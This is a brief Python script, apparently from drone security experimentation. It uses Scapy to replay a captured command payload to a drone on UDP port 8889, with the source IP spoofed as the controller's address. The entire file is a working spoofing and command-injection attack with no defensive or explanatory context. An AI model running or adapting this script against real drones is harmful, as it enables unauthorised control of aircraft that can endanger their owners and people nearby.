from scapy.all import *

# load the pcap files
packets = rdpcap("modified_6_3_src_5_15.pcap")
action_packets = rdpcap("extract_action.pcap")

desired_payload=None

if Raw in action_packets[0]:
    desired_payload = action_packets[0][Raw].load 

udp_packets = []
for pkt in packets:
    if UDP in pkt and pkt[UDP].dport == 8889:
        udp_packets.append(pkt)


drone_ip = "192.168.10.1"
controller_ip = "192.168.10.2"

if desired_payload:
    for pkt in udp_packets:
        new_packet = IP(src=controller_ip, dst=drone_ip)/UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)/desired_payload
        send(new_packet)
else:
    print("no payload found.")
